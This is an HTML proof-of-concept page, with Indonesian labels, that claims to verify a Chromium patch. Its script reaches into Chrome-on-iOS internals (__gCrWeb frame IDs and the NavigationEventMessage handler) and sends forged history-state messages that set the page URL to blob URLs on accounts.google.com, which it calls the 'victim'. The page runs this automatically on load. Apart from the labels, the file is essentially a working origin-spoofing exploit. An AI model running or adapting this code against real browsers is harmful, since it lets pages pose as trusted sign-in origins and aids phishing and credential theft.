<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Patch Verification PoC - Commit 8291494</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0b0f19; color: #f3f4f6; }
        .card { background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); margin-bottom: 20px; }
        h1 { color: #38bdf8; font-size: 20px; margin-top: 0; }
        .target { color: #fca5a5; font-weight: bold; }
        .info { color: #60a5fa; font-weight: bold; }
        pre { background: #030712; color: #4ade80; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #1f2937; max-height: 300px; }
        .btn-group { margin-top: 15px; }
        button { background: #2563eb; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1d4ed8; }
    </style>
</head>
<body>

<div class="card">
    <h1>Patch Verification Tool: Commit 8291494</h1>
    <p>Target Uji Coba: <span class="target">accounts.google.com / example.com</span></p>
    <p>Status Proteksi: <span class="info">Mengevaluasi url::IsSameOriginWith...</span></p>
    
    <div class="btn-group">
        <button id="run-verify">Jalankan Pengujian Validasi Patch</button>
    </div>
</div>

<div class="card">
    <h3>Log Hasil Evaluasi Native:</h3>
    <pre id="console-log">[*] Modul verifikasi siap berjalan...\n</pre>
</div>

<script>
(function() {
    const TARGET_VICTIM = "accounts.google.com";
    
    // Vektor uji lintas asal yang sesuai dengan unit test Chromium
    const testVectors = [
        "blob:https://" + TARGET_VICTIM + "/signin",
        "blob:http://" + TARGET_VICTIM + "/signin",
        "blob:https://bar.com/test"
    ];

    function log(msg) {
        const pre = document.getElementById('console-log');
        pre.textContent += msg + '\n';
        pre.scrollTop = pre.scrollHeight;
    }

    const mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log('[!] CRITICAL: Handler "NavigationEventMessage" tidak ditemukan.');
        return;
    }

    let frameId = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            frameId = window.__gCrWeb.getFrameId();
        }
    } catch (e) {}

    if (!frameId) {
        const altAccessors = [
            () => window.__gCrWeb.common.getFrameId(),
            () => window.__gCrWeb.message.getFrameId(),
            () => window.__gCrWeb.frameId
        ];
        for (let i = 0; i < altAccessors.length && !frameId; i++) {
            try { frameId = altAccessors[i](); } catch(err){}
        }
    }

    if (!frameId) {
        log('[-] GAGAL: frame_id tidak ditemukan.');
        return;
    }

    function runVerification() {
        log('[*] Mengirimkan vektor uji lintas asal untuk menguji respons patch 8291494...');
        
        testVectors.forEach((targetUrl, idx) => {
            try {
                log(`\n-> Menguji Vektor #${idx + 1}: ${targetUrl}`);
                
                mh.NavigationEventMessage.postMessage({
                    command: 'willChangeState',
                    frame_id: frameId
                });

                mh.NavigationEventMessage.postMessage({
                    command: 'didReplaceState',
                    frame_id: frameId,
                    stateObject: JSON.stringify({ test: true }),
                    baseUrl: 'https://x/',
                    pageUrl: targetUrl
                });

                log('   [ok] Pesan terkirim. Pada browser dengan patch 8291494, operasi ini menjadi no-op.');
            } catch (ex) {
                log(`   [!] Error: ${ex.message}`);
            }
        });
    }

    document.getElementById('run-verify').onclick = runVerification;
    setTimeout(runVerification, 500);

})();
</script>

</body>
</html>
